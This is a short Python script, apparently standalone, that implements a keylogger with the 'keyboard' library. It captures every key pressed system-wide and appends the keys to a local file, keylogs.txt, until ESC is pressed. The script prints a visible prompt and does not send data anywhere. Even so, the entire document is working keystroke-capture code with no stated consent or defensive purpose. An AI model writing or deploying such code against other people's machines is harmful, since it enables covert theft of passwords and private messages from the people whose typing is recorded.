import keyboard

def record_keystrokes():
    try:
        with open('keylogs.txt', 'a') as f:
            print("Press ESC to stop recording")
            while True:
                event = keyboard.read_event()
                if event.name == 'esc':
                    break
                elif event.name in ['space', 'enter']:
                    f.write('[' + event.name.upper() + ']')
                else:
                    f.write(event.name)
    except Exception as e:
        print("An error occurred while recording keystrokes:", e)

if __name__ == "__main__":
    record_keystrokes()